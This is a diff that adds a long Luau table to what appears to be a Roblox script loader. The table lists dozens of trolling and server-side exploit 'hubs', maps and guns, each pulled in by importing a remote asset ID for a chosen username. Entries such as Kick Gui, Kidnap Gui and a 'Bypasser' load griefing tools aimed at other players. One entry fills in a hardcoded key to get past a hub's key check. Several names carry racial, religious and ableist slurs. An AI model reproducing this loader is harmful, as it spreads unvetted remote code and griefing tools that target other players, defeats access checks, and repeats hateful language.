+			Name = "Dreaming Gui",
+			Function = function(Username: string) import(3638246800).load(Username) end
+		},
+		{
+			Name = "AlexPlays Hub",
+			Function = function(Username: string) import(7344992580):alexplaysgui(Username) end
+		},
+		{
+			Name = "Foldzx4 Hub",
+			Function = function(Username: string)
+				import(7329498718):XD(Username)
+				task.delay(1, function()
+					local Key = Players[Username].PlayerGui.Foldzx4Hub.KeyFrame.Key
+					Key.Text = "arAimSp26tDU9HddwyGJ"
+				end)
+			end
+		},
+		{
+			Name = "Mlem Gui",
+			Function = function(Username: string) import(6710125107).mlem(Username) end
+		},
+		{
+			Name = "No BL Gui",
+			Function = function(Username: string) import(4857508756).noblgui(Username) end
+		},
+		{
+			Name = "Lightning Cannon Gui",
+			Function = function(Username: string) import(1071722458).load(Username) end
+		},
+		{
+			Name = "Vine GUI",
+			Function = function(Username: string) import(6673860359).itsmyfault(Username) end
+		},
+		{
+			Name = "Kaspers Hub V3",
+			Function = function(Username: string) import(6089562912).tortillaload(Username) end
+		},
+		{
+			Name = "Kaspers Trolling Gui V2",
+			Function = function(Username: string) import(6414405864).KUTG(Username) end
+		},
+		{
+			Name = "Kaspers Hub V1.5",
+			Function = function(Username: string) import(5665100502).Kofu(Username) end
+		},
+		{
+			Name = "Kaspers Trolling Gui 500 Edition",
+			Function = function(Username: string) import(5152037495).holyshitthisissorarepleasedontfuckingleak(Username) end
+		},
+		{
+			Name = "Kaspers Hub OSC",
+			Function = function(Username: string) import(5552065204).Robrac2washereholy(Username) end
+		},
+		{
+			Name = "Kaspers Hub V2",
+			Function = function(Username: string) import(5716279884).hewo(Username) end
+		},
+		{
+			Name = "Kaspers Trolling Gui V1",
+			Function = function(Username: string) import(5066549975):Haii(Username) end
+		},
+		{
+			Name = "Kaspers Stuff V1",
+			Function = function(Username: string) import(4882817184).no(Username) end
+		},
+		{
+			Name = "Kaspers Hub V2 Edit",
+			Function = function(Username: string) import(5711722755).KaspersHubV2(Username) end
+		},
+		{
+			Name = "Kaspers Stuff V2",
+			Function = function(Username: string) import(4969569532).k2(Username) import(7219625364):Load(Username, "KSV2") end
+		},
+		{
+			Name = "Bubbyjo's Private GUI",
+			Function = function(Username: string) import(5062815043):bubbyjoprivate(Username) end
+		},
+		{
+			Name = "Good GUI V4",
+			Function = function(Username: string) import(6067273022).OMG_OP(Username) end
+		},
+		{
+			Name = "Expination GUI",
+			Function = function(Username: string) import(6050789055)(Username) end
+		},
+		{
+			Name = "Banisher GUI",
+			Function = function(Username: string) import(5342180328).AlrightAlrightYouCaughtMeSimpingForPokimaneButH0wWillThatHelpYouG0OdSir(Username) end
+		},
+		{
+			Name = "B E A T S Gui",
+			Function = function(Username: string) import(6025181099).load(Username) end
+		},
+		{
+			Name = "Beans Gui",
+			Function = function(Username: string) import(4649145907).oCAG(Username) end
+		},
+		{
+			Name = "Black Man Gui",
+			Function = function(Username: string) import(4798589756):UTG(Username) end
+		},
+		{
+			Name = "Control Gui",
+			Function = function(Username: string) import(4773518229).load(Username) end
+		},
+		{
+			Name = "Dysphoria Hub",
+			Function = function(Username: string) import(4055186486).SSGUI(Username) end
+		},
+		{
+			Name = "Gear Gui",
+			Function = function(Username: string) import(4599521060).FT(Username) end
+		},
+		{
+			Name = "Glitcher Gui (Have UXI Glitcher)",
+			Function = function(Username: string) import(4844085867).GL(Username) end
+		},
+		{
+			Name = "Hentai Lovers Gui",
+			Function = function(Username: string) import(5346235551).B1847(Username) end
+		},
+		{
+			Name = "Impatientz Trolling Gui",
+			Function = function(Username: string) import(6253491540):Fire(Username) end
+		},
+		{
+			Name = "Kick Gui",
+			Function = function(Username: string) import(4694654493).load(Username) end
+		},
+		{
+			Name = "Kidnap Gui",
+			Function = function(Username: string) import(5121582789).load(Username) end
+		},
+		{
+			Name = "Mod Gui",
+			Function = function(Username: string) import(4978229427):Fire(Username) end
+		},
+		{
+			Name = "Player Size Gui",
+			Function = function(Username: string) import(5194254117).load(Username) end
+		},
+		{
+			Name = "Rainbowitz Gui",
+			Function = function(Username: string) import(3767489482).rainbowitz(Username) end
+		},
+		{
+			Name = "Ultimate Gui X",
+			Function = function(Username: string) import(6453099059).load(Username) end
+		},
+		{
+			Name = "Skidded Bible Hub",
+			Function = function(Username: string) import(7604637696):SKID(Username) end
+		},
+		{
+			Name = "Reain Hub",
+			Function = function(Username: string) import(8002661223).Gamers(Username) end
+		},
+		{
+			Name = "Shorts Hub",
+			Function = function(Username: string) import(6339740330).load(Username) end
+		},
+		{
+			Name = "Adminus Hub",
+			Function = function(Username: string) import(7910750147).Adminus(Username) end
+		},
+		{
+			Name = "Future Hub",
+			Function = function(Username: string) import(7955684705).Future(Username) end
+		},
+		{
+			Name = "Geacron Hub",
+			Function = function(Username: string) import(7823892084).GC(Username) end
+		},
+		{
+			Name = "Dark Op Hub",
+			Function = function(Username: string) import(7202959838).Slient(Username) end
+		},
+		{
+			Name = "Ching Hub",
+			Function = function(Username: string) import(5169487421).skidded(Username) end
+		},
+		{
+			Name = "FMG Hub",
+			Function = function(Username: string) import(5845992226).R0FL(Username) end
+		},
+		{
+			Name = "Fatass Hub",
+			Function = function(Username: string) import(6868237150)(Username) end
+		},
+		{
+			Name = "Master Hub V2",
+			Function = function(Username: string) import(6358863089).MarcoX(Username) end
+		},
+		{
+			Name = "OMG Hub V2",
+			Function = function(Username: string) import(6994028937).omg_hub_v2(Username) end
+		},
+		{
+			Name = "Poo Pee Stinky Hub",
+			Function = function(Username: string) import(6440873140).load(Username) end
+		},
+		{
+			Name = "The Community Hub",
+			Function = function(Username: string) import(4743316233):C0mmunity(Username) end
+		},
+		{
+			Name = "Wary's Hub Edit 1",
+			Function = function(Username: string) import(6889197456)["????????????????????????????????????????????????????????????????????????????????????????????????????"](Username) end
+		},
+		{
+			Name = "SS Hub Detector",
+			Function = function(Username: string) import(7459894071).Detect(Username) end
+		},
+		{
+			Name = "Domain X Hub",
+			Function = function(Username: string) import(7625405003).DomainX(Username) end
+		},
+		{
+			Name = "Sans_GBoard Hub Remake",
+			Function = function(Username: string) import(7265631746):SGHR(Username) end
+		},
+		{
+			Name = "BTT Hub",
+			Function = function(Username: string) import(import(13362490517).get([[sad9)*9h2r38e]], [[#&73gduc33t3Y]])).LoadMain(Username) end
+		},
+		{
+			Name = "Gregorian Hub V2",
+			Function = function(Username: string) import(6888054758)(Players[Username]) end
+		},
+		{
+			Name = "Gregorian Hub V3",
+			Function = function(Username: string) import(7163258794)(Players[Username]) end
+		},
+		{
+			Name = "SixHax Hub",
+			Function = function(Username: string) import(7506278997).OfficialTrirSkiddedScript(Username) end
+		},
+		{
+			Name = "Star Hub",
+			Function = function(Username: string) import(7459624352).OfficialTrirSkiddedScript(Username) end
+		},
+		{
+			Name = "Not Rare Hub",
+			Function = function(Username: string) import(7459550515).OfficialTrirSkiddedScript(Username) end
+		},
+		{
+			Name = "Explode Hub",
+			Function = function(Username: string) import(7361396142):Explodehub(Username) end
+		},
+		{
+			Name = "Trollware Hub",
+			Function = function(Username: string) import(0x1A232BA8A).load(Username) end
+		},
+		{
+			Name = "Lazy SS Hub",
+			Function = function(Username: string) import(7933376386):LazySS(Username) end
+		},
+		{
+			Name = "XTress Hub",
+			Function = function(Username: string) import(7166565728)():XTress(Username) end
+		},
+		{
+			Name = "Lots o Guns",
+			Function = function(Username: string) import(7263075258).cool(Username) end
+		},
+		{
+			Name = "Nemo Hub",
+			Function = function(Username: string) import(7343001332):NHub(Username) end
+		},
+		{
+			Name = "Best Hub",
+			Function = function(Username: string) import(4634558715)(Username) end
+		},
+		{
+			Name = "Fat Hub",
+			Function = function(Username: string) import(7162002057):fathub(Username) end
+		},
+		{
+			Name = "Novo Hub",
+			Function = function(Username: string) import(7153158314).Novo(Username) end
+		},
+		{
+			Name = "Tricky Hub",
+			Function = function(Username: string) import(7163392465).trickyass(Username) end
+		},
+		{
+			Name = "Kars Hub",
+			Function = function(Username: string) import(7162101078).stopleakinguskid(Username) end
+		},
+		{
+			Name = "Falcon Hub",
+			Function = function(Username: string) import(7146543674).load(Username) end
+		},
+		{
+			Name = "Hub SS",
+			Function = function(Username: string) import(7142057043).hubssontop(Username) end
+		},
+		{
+			Name = "EFI Hub",
+			Function = function(Username: string) import(7163156979):EngineersUTG(Username) end
+		},
+		{
+			Name = "PPSH Hub",
+			Function = function(Username: string) import(6440873140).load(Username) end
+		},
+		{
+			Name = "Corn Pupper Hub",
+			Function = function(Username: string) import(6357616856).cornpupperisthebest(Username) end
+		},
+		{
+			Name = "Eleatra Hub",
+			Function = function(Username: string) import(6431039589).loololol(Username) end
+		},
+		{
+			Name = "Noob Hub",
+			Function = function(Username: string) import(6200893021).AAA(Username) end
+		},
+		{
+			Name = "Godcat Hub",
+			Function = function(Username: string) import(5970185601):oof(Username) end
+		},
+		{
+			Name = "Boss Hub V2",
+			Function = function(Username: string) import(5923659964)(6500562272)(Username) end
+		},
+		{
+			Name = "Sun Hub V2",
+			Function = function(Username: string) import(6506138172).SunHubRelauch(Username) end
+		},
+		{
+			Name = "Bizie Hub",
+			Function = function(Username: string) import(6293966091).Sex(Username) end
+		},
+		{
+			Name = "Rekek Hub",
+			Function = function(Username: string) import(6989483616).kek(Username) end
+		},
+		{
+			Name = "Paint Hub",
+			Function = function(Username: string) import(6993991648).loadpainthub(Username) end
+		},
+		{
+			Name = "Sans_GBoard Hub",
+			Function = function(Username: string) import(7252112522):XD(Username) end
+		},
+		{
+			Name = "Progod Hub 2",
+			Function = function(Username: string) import(6988334446):progod995555_Hub(Username) end
+		},
+		{
+			Name = "Progod Hub 3",
+			Function = function(Username: string) import(6988369913):progod995555_Hub(Username) end
+		},
+		{
+			Name = "Calamaty Hub V3",
+			Function = function(Username: string) import(7593715162).load(Username) end
+		},
+		{
+			Name = "Calamaty Hub V2",
+			Function = function(Username: string) 
+				if not LocalizationService:FindFirstChild("Jetray#4509") then
+					local a = Instance.new("Folder", LocalizationService)
+					a.Name = "Jetray#4509"
+				end
+				import(6811251535).load(Username) 
+			end
+		},
+		{
+			Name = "Calamaty Hub V1",
+			Function = function(Username: string)
+				if LocalizationService:FindFirstChild("Jetray#4509") then
+					LocalizationService:FindFirstChild("Jetray#4509"):Destroy()
+				end
+				import(6945981431).load(Username)
+			end
+		},
+		{
+			Name = "Andiels Hub",
+			Function = function(Username: string) import(6607479098).Op(Username) end
+		},
+		{
+			Name = "LoolololsHub V2",
+			Function = function(Username: string) import(7173076750).JKeepsayslololoolisaretard(Username) end
+		},
+		{
+			Name = "Horny Hub", 
+			Function = function(Username: string) import(6911122724):Horny(Username, "IsHorny") end
+		},
+		{
+			Name = "Excellant Bizzare Hub",
+			Function = function(Username: string) import(6873234316).load(Username) end
+		},
+		{
+			Name = "Retro Hub V2",
+			Function = function(Username: string) import(6607879154).v2(Username) end
+		},
+		{
+			Name = "Shark Hub V2",
+			Function = function(Username: string) import(6901058035).load(Username) end
+		},
+		{
+			Name = "LoolololsHub V1",
+			Function = function(Username: string) import(5990231241).LoolololsHub(Username) end
+		},
+		{
+			Name = "Astro Hub V2",
+			Function = function(Username: string)
+				import(6783692823).load(Username)
+				task.defer(import(7219625364).Load, import(7219625364), Username, "ASTRO")
+			end
+		},
+		{
+			Name = "Goner Hub",
+			Function = function(Username: string) import(5954678096)(Username) end
+		},
+		{
+			Name = "W/3 Hub",
+			Function = function(Username: string) import(6825535011)(Username) end
+		},
+		{
+			Name = "Zanithony Hub",
+			Function = function(Username: string) import(6820500513).AlakazamX781325(Username) end
+		},
+		{
+			Name = "Vascepa Hub",
+			Function = function(Username: string) import(6009547419).Fire(Username) end
+		},
+		{
+			Name = "Ben's Hub",
+			Function = function(Username: string) import(5152175374).BIGBEN(Username) end
+		},
+		{
+			Name = "Zalgo Hub V3",
+			Function = function(Username: string)
+				import(5624256033).zb(Username)
+				task.delay(1, import(7219625364).Load, import(7219625364), Username, "ZALGO")
+			end,
+		},
+		{
+			Name = "Free Scripts Hub V1",
+			Function = function(Username: string) import(6723530463).Fire(Username) end
+		},
+		{
+			Name = "Undetected Hub V2 Normal",
+			Function = function(Username: string) import(5673170715).Leak(Username) end
+		},
+		{
+			Name = "Anime Hub V1",
+			Function = function(Username: string) import(6778836624).Anime(Username) end
+		},
+		{
+			Name = "Orange Hub",
+			Function = function(Username: string) import(6436920130).Orange(Username) end
+		},
+		{
+			Name = "Hacer Hub",
+			Function = function(Username: string) import(6505859516).HacerHub(Username) end
+		},
+		{
+			Name = "Orange Juice Hub",
+			Function = function(Username: string) import(5518717049).give(Username) end
+		},
+		{
+			Name = "Primus Hub",
+			Function = function(Username: string) import(5371958348).load(Username) end
+		},
+		{
+			Name = "Nono Hub",
+			Function = function(Username: string) import(4616624781).load(Username) end
+		},
+		{
+			Name = "Fallens Hub",
+			Function = function(Username: string) import(6572214439).leak(Username) end
+		},
+		{
+			Name = "Rose Hub",
+			Function = function(Username: string) import(6310893908).load(Username) end
+		},
+		{
+			Name = "Scepters Hub",
+			Function = function(Username: string)
+				import(7219625364):Load(Username, "SCEPT")
+				task.defer(import(5458816038).load, "adamtomas11")
+			end,
+		},
+		{
+			Name = "qb6ScriptHub",
+			Function = function(Username: string) import(4749329817):qb6ScriptHub2(Username) end
+		},
+		{
+			Name = "Eltrey Hub",
+			Function = function(Username: string) import(6660023679).Eltrey(Username) end
+		},
+		{
+			Name = "CK's Tool Hub",
+			Function = function(Username: string) import(6741438401).CK(Username) end
+		},
+		{
+			Name = "Cat Hub",
+			Function = function(Username: string) import(4889580993).unikitty(Username) end
+		},
+		{
+			Name = "Ty Hub V1",
+			Function = function(Username: string) import(5919418431).hub(Username) end
+		},
+		{
+			Name = "Ty Hub V2",
+			Function = function(Username: string) import(6319902286).V2(Username) end
+		},
+		{
+			Name = "Corrupt Hub",
+			Function = function(Username: string) import(6239141008).e(Username) end
+		},
+		{
+			Name = "ZonerHub Remake",
+			Function = function(Username: string) import(5955257532):Fire(Username) end
+		},
+		{
+			Name = "NotGods Hub",
+			Function = function(Username: string) import(6242659651):NGHub(Username) end
+		},
+		{
+			Name = "Lits Hub",
+			Function = function(Username: string) import(6653579134).lits_Script_hub(Username) end
+		},
+		{
+			Name = "Skid Beater V1 Hub",
+			Function = function(Username: string) import(6373119037).skid(Username) end
+		},
+		{
+			Name = "Afteline SS",
+			Function = function(Username: string) import(6405615921).AFTELINEHUB(Username) end
+		},
+		{
+			Name = "SNAKE HUB",
+			Function = function(Username: string) import(6543143914).SnakeHub(Username) end
+		},
+		{
+			Name = "Solitude Hub",
+			Function = function(Username: string) import(6290222193).load(Username) end
+		},
+
+		{
+			Name = "MAGA Hub",
+			Function = function(Username: string)
+				import(7219625364):Load(Username, "MAGA")
+				task.defer(import(6650976983), "Bypasser1")
+			end
+		},
+		{
+			Name = "Dababy Hub",
+			Function = function(Username: string) import(6550641244)(Username) end
+		},
+		{
+			Name = "Jimo Hub",
+			Function = function(Username: string)
+				import(5742138267).Jimmy_Giovannas_burgers(Username)
+				import(7219625364):Load(Username, "Jimo")
+			end
+		},
+		{
+			Name = "Doki Doki Hub",
+			Function = function(Username: string) import(5662351054):DokiDoki("DokiDoki",Username) end
+		},
+		{
+			Name = "Ghost Hub",
+			Function = function(Username: string) import(5135137824).GhostHub(Username) end
+		},
+		{
+			Name = "SS Hub 1",
+			Function = function(Username: string) import(4959057351).load(Username) end
+		},
+		{
+			Name = "Salvation Hub",
+			Function = function(Username: string) import(6327292058).Salvation(Username) end
+		},
+		{
+			Name = "Undertale HUB",
+			Function = function(Username: string) import(5778027005).underman(Username) end
+		},
+		{
+			Name = "Pizza HUB",
+			Function = function(Username: string) import(5049996741).pizza(Username,"V1") end
+		},
+		{
+			Name = "Wary Hub",
+			Function = function(Username: string)
+				import(7219625364):Load(Username, "WARY")
+				task.defer(import(7064810088).Wary, "WaryRGMCA5")
+			end
+		},
+		{
+			Name = "3XPL Hub",
+			Function = function(Username: string) import(6360620786).get(Username) end
+		},
+		{
+			Name = "Trolli Hub",
+			Function = function(Username: string) import(4815598242).Trolli(Username) end
+		},
+		{
+			Name = "Asylum Hub",
+			Function = function(Username: string) import(4992512410):Asylumgotskidded(Username) end
+		},
+		{
+			Name = "Avry Hub",
+			Function = function(Username: string) import(5580599015).load(Username) end
+		},
+		{
+			Name = "Boss Hub",
+			Function = function(Username: string) import(4934814822).Boss(Username) end
+		},
+		{
+			Name = "Cyz Hub",
+			Function = function(Username: string) import(5669430537).cyzhub(Username) end
+		},
+		{
+			Name = "DVSG Hub",
+			Function = function(Username: string) import(5916076617).dvsg(Username) end
+		},
+		{
+			Name = "Dysphoria Hub",
+			Function = function(Username: string) import(4055186486).SSGUI(Username) end
+		},
+		{
+			Name = "Exoliner Hub",
+			Function = function(Username: string) import(5610583050).EXOHUB(Username) end
+		},
+		{
+			Name = "Fire SS Hub",
+			Function = function(Username: string) import(5095430548):load(Username) end
+		},
+		{
+			Name = "Glitch Hub",
+			Function = function(Username: string) import(5487274946).GLITCHED(Username) end
+		},
+		{
+			Name = "Glitcher Hub",
+			Function = function(Username: string) import(5814695361).Glitcher(Username) end
+		},
+		{
+			Name = "Hexine Hub",
+			Function = function(Username: string) import(5419240318).PraiseSkidGod(Username) end
+		},
+		{
+			Name = "Homebrew Hub",
+			Function = function(Username: string) import(5623958981).homebrew(Username) end
+		},
+		{
+			Name = "John Doe Hub",
+			Function = function(Username: string) import(6292973718).SkidHubHub(Username) end
+		},
+		{
+			Name = "John Doe Hub V2",
+			Function = function(Username: string) import(6761500599).S.T.R.A.N.G.E.R(Username) end
+		},
+		{
+			Name = "Kaks hub",
+			Function = function(Username: string) import(5868025435).load(Username) end
+		},
+		{
+			Name = "Kickisher Hub Edit",
+			Function = function(Username: string) import(5372237895).awdhawjdhajdhadhadddddwdwdwdwdwdwwdwddwwddw(Username) end
+		},
+		{
+			Name = "Lamonica Hub",
+			Function = function(Username: string) import(6033027808).load(Username) end
+		},
+		{
+			Name = "Linori Hub",
+			Function = function(Username: string) import(5466852956).eliza(Username) end
+		},
+		{
+			Name = "Neko Hub",
+			Function = function(Username: string) import(6125142937).NekoHub(Username) end
+		},
+		{
+			Name = "Nekoholic Hub",
+			Function = function(Username: string) import(5814820527).load(Username) end
+		},
+		{
+			Name = "Nemesis Hub",
+			Function = function(Username: string) import(5633539945):adrian(Username) end
+		},
+		{
+			Name = "PikaX Hub",
+			Function = function(Username: string) import(4813227802){Username} end
+		},
+		{
+			Name = "Privote Hub",
+			Function = function(Username: string) import(5657179307).Privote(Username) end
+		},
+		{
+			Name = "Retro Hub",
+			Function = function(Username: string) import(6292814831).SkidHubHub(Username) end
+		},
+		{
+			Name = "Roff Hub",
+			Function = function(Username: string) import(5681948486).roffhubisthebest(Username) end
+		},
+		{
+			Name = "Sakura Hub",
+			Function = function(Username: string) import(6292875055).SkidHubHub(Username) end
+		},
+		{
+			Name = "Satan Hub Edit",
+			Function = function(Username: string) import(5111129327).SatanHUBEDIT(Username) end
+		},
+		{
+			Name = "Skidded Hub",
+			Function = function(Username: string) import(5980039667).Skidded(Username) end
+		},
+		{
+			Name = "Sonic Hub",
+			Function = function(Username: string) import(5352721272):Fire(Username) end
+		},
+		{
+			Name = "Spaghetti Hub",
+			Function = function(Username: string) import(5121570975).SpaghettiHub(Username) end
+		},
+		{
+			Name = "Spong Hub",
+			Function = function(Username: string) import(5203976741).spong(Username) end
+		},
+		{
+			Name = "Trir Hub",
+			Function = function(Username: string) import(5823090050).TrirHubOP(Username) end
+		},
+		{
+			Name = "Ultra Hub V2",
+			Function = function(Username: string) import(5275752166).ULTRAV2(Username) end
+		},
+		{
+			Name = "Under Hub",
+			Function = function(Username: string) import(6103193016).load(Username) end
+		},
+		{
+			Name = "Undetected Hub",
+			Function = function(Username: string) import(14125895412).SkidHubHub(Username) end
+		},
+		{
+			Name = "Undetected Hub V2 Premium",
+			Function = function(Username: string) import(5001982403).undetected(Username) end
+		},
+		{
+			Name = "Unspeakable's Hub",
+			Function = function(Username: string) import(35*2271.8).hello(Username, "antgame11iscool") end
+		},
+		{
+			Name = "Vanta X Hub",
+			Function = function(Username: string) import(6275245987).VantaX(Username) end
+		},
+		{
+			Name = "Zalgo Hub",
+			Function = function(Username: string) import(5422891468).zal(Username) end
+		},
+		{
+			Name = "Lightning Cannon UTG",
+			Function = function(Username: string) import(1071722458).load(Username) end
+		},
+		{
+			Name = "Lien's UTG",
+			Function = function(Username: string) import(5229269080).cool(Username) end
+		},
+		{
+			Name = "UTG Dark Mode",
+			Function = function(Username: string) import(6123915291).load(Username) end
+		},
+		{
+			Name = "Ants UTG V6",
+			Function = function(Username: string) import(6133900151).UTG(Username) end
+		},
+		{
+			Name = "Ants UTG V5",
+			Function = function(Username: string) import(5128274968).GetAntsUtgV5(Username) end
+		},
+		{
+			Name = "Ants UTG V4",
+			Function = function(Username: string) import(4593936027).oof(Username) end
+		},
+		{
+			Name = "Ants UTG V3",
+			Function = function(Username: string) import(5178055258).ant(Username) end
+		},
+		{
+			Name = "Ants UTG V2",
+			Function = function(Username: string) import(5752573097).AntsUtgV2(Username) end
+		},
+		{
+			Name = "Ants UTG V1",
+			Function = function(Username: string) import(4965486193).load(Username) end
+		},
+		{
+			Name = "Christmas Utg",
+			Function = function(Username: string) import(6551277795)(Username) end
+		},
+		{
+			Name = "Godspawns Utg",
+			Function = function(Username: string) import(5146396793).load(Username) end
+		},
+		{
+			Name = "Pink UTG",
+			Function = function(Username: string) import(5272695549).pinkutg(Username) end
+		},
+		{
+			Name = "Waffle Utg",
+			Function = function(Username: string) import(4888348180):Waffl7SSCracked(Username) end
+		},
+	},
+
+	Maps = {
+		{ 
+			Name = "KFC Restaurant",
+			Function = function(Username: string) import(3615713971).load() end
+		},
+		{
+			Name = "Breaking Bad",
+			Function = function(Username: string) import(17754541763).lab() end
+		},
+		{
+			Name = "Doomspire",
+			Function = function(Username: string) import(17526951723) end
+		},
+		{ 
+			Name = "McDonalds",
+			Function = function(Username: string) import(15855797879) end
+		},
+		{ 
+			Name = "Thiccdonalds",
+			Function = function(Username: string) import(5244657610).Thiccc(Username) end
+		},
+		{
+			Name = "Baldi School",
+			Function = function(Username: string) import(6058180303).school(Username) end
+		},
+		{
+			Name = "Escape Room",
+			Function = function(Username: string) import(9442729068).escaperoom(Username) end
+		},
+		{
+			Name = "Alien Planet",
+			Function = function(Username: string) import(8063350323).daplanet(Username) end
+		},
+		{
+			Name = "Arab Tomfoolery",
+			Function = function(Username: string) import(11497847642).map(Username) end
+		},
+		{
+			Name = "Tardis",
+			Function = function(Username: string) import(5416097039).TARDISDelta(Username) end
+		},
+		{
+			Name = "Allahu Akbar",
+			Function = function(Username: string) import(3400876685).lol(Username) end
+		},
+		{
+			Name = "Mountain Airbnb",
+			Function = function(Username: string) import(7993365051).CLoad() end
+		},
+		{
+			Name = "Park",
+			Function = function(Username: string) import(14645048422).load() end
+		},
+		{
+			Name = "Some Battle Map",
+			Function = function(Username: string) import(9839386252)(Username) end
+		},
+		{
+			Name = "Twin Towers",
+			Function = function(Username: string) import(13536836982).TWINTOWER(Username) end
+		},
+		{
+			Name = "Ohio V2",
+			Function = function(Username: string) import(14288620360).ohiov2(Username) end
+		},
+		{
+			Name = "Battle Arena",
+			Function = function(Username: string) import(10037552250).ced(Username) end
+		},
+		{
+			Name = "Spookey Map",
+			Function = function(Username: string) import(7682935289).DemoThings(Username) end
+		},
+		{
+			Name = "Zombie Map",
+			Function = function(Username: string) import(12653566767).load(Username) end
+		},
+		{
+			Name = "Crossroads Violence",
+			Function = function(Username: string) import(13190797313)() end
+		},
+		{
+			Name = "Ultmate Driving",
+			Function = function(Username: string) import(14679148125)(Username) end
+		},
+		{
+			Name = "Random Map",
+			Function = function(Username: string) import(3883373666).celebrate_for_xio() end
+		},
+		{
+			Name = "Natural Disaster Survival",
+			Function = function(Username: string) import(14704225060).nds(Username) end
+		},
+		{ 
+			Name = "Clockwork Arena",
+			Function = function(Username: string) import(13887518057)() end
+		},
+		{ 
+			Name = "Quantom Science Lab",
+			Function = function(Username: string) import(7737379602).map() end
+		},
+		{ 
+			Name = "Check It Maze",
+			Function = function(Username: string) import(7232315561).loadmap() end
+		},
+		{ 
+			Name = "Paintball Field",
+			Function = function(Username: string) import(3155384115).loadmap() end
+		},
+		{ 
+			Name = "Clown Map",
+			Function = function(Username: string) import(5193810610).loadmap() end
+		},
+		{ 
+			Name = "Dungeon Map",
+			Function = function(Username: string) import(4081024299).loadmap() end
+		},
+		{ 
+			Name = "Guest House Map",
+			Function = function(Username: string) import(4063168815).loadmap() end
+		},
+		{ 
+			Name = "Tantive Space Map",
+			Function = function(Username: string) import(4081020916).loadmap() end
+		},
+		{ 
+			Name = "Sewers Map",
+			Function = function(Username: string) import(4109315506).loadmap() end
+		},
+		{ 
+			Name = "Mysterious Castle Map",
+			Function = function(Username: string) import(4064253291).loadmap() end
+		},
+		{ 
+			Name = "CS:GO Office Map",
+			Function = function(Username: string) import(3155301605).loadmap() end
+		},
+		{ 
+			Name = "Walmart Map",
+			Function = function(Username: string) import(6763551855).map() end
+		},
+		{ 
+			Name = "Prision Life Map",
+			Function = function(Username: string) import(4448395290):_Users_wedon_AppData_Local_Roblox_Versions_version() end
+		},
+		{ 
+			Name = "FNAF Map",
+			Function = function(Username: string) import(12070820190).fnaf1() end
+		},
+		{ 
+			Name = "Realistic Nature Map",
+			Function = function(Username: string) import(6877548743)(false) end
+		},
+		{ 
+			Name = "Ohio Map",
+			Function = function(Username: string) import(12015898055).ohio_place(Username)  end
+		},
+		{ 
+			Name = "2018 B Core Map",
+			Function = function(Username: string) import(13951520080)(Username)  end
+		},
+		{ 
+			Name = "Drive To A Pizzeria V.2 Map",
+			Function = function(Username: string) import(10998591046).pizzadrift() end
+		},
+		{ 
+			Name = "Doors Map",
+			Function = function(Username: string) import(14180776090).map() end
+		},
+	},
+
+	Guns = {
+		{
+			Name = "Zenit AS VAL",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Zenit AS VAL") end
+		},
+		{
+			Name = ".357 Magnum",
+			Function = function(Username: string) import(12246306459).GetGun(Username, ".357 Magnum") end
+		},
+		{
+			Name = ".44 Magnum",
+			Function = function(Username: string) import(12246306459).GetGun(Username, ".44 Magnum") end
+		},
+		{
+			Name = "590 Mariner",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "590 Mariner") end
+		},
+		{
+			Name = "9mm Sword Cutlass",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "9mm Sword Cutlass") end
+		},
+		{
+			Name = "AA-12",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "AA-12") end
+		},
+		{
+			Name = "AA-12 CQB",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "AA-12 CQB") end
+		},
+		{
+			Name = "AAC Honey Badger PDW",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "AAC Honey Badger PDW") end
+		},
+		{
+			Name = "AEK971",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "AEK971") end
+		},
+		{
+			Name = "AK-103",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "AK-103") end
+		},
+		{
+			Name = "AK-12",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "AK-12") end
+		},
+		{
+			Name = "AK-12 Scoped",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "AK-12 Scoped") end
+		},
+		{
+			Name = "AK-74u",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "AK-74u") end
+		},
+		{
+			Name = "explode",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "explode") end
+		},
+		{
+			Name = "AK74",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "AK74") end
+		},
+		{
+			Name = "AK74M",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "AK74M") end
+		},
+		{
+			Name = "AKM",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "AKM") end
+		},
+		{
+			Name = "AKM Scoped",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "AKM Scoped") end
+		},
+		{
+			Name = "AN-94",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "AN-94") end
+		},
+		{
+			Name = "AN-94 Custom",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "AN-94 Custom") end
+		},
+		{
+			Name = "XM8",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "XM8") end
+		},
+		{
+			Name = "AR-15 Long Scope",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "AR-15 Long Scope") end
+		},
+		{
+			Name = "AR-15 Short Scope",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "AR-15 Short Scope") end
+		},
+		{
+			Name = "AS VAL",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "AS VAL") end
+		},
+		{
+			Name = "AUG A1",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "AUG A1") end
+		},
+		{
+			Name = "AUG A2",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "AUG A2") end
+		},
+		{
+			Name = "AUG A3",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "AUG A3") end
+		},
+		{
+			Name = "AWM",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "AWM") end
+		},
+		{
+			Name = "AWP",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "AWP") end
+		},
+		{
+			Name = "Artillery Luger",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Artillery Luger") end
+		},
+		{
+			Name = "Baikal MR-153",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Baikal MR-153") end
+		},
+		{
+			Name = "Barrett M107",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Barrett M107") end
+		},
+		{
+			Name = "Black Barrett M82",
+			Function = function(Username: string) import(12246306459).GetGun(Username, "Black Barrett M82") end
+		},
+		{
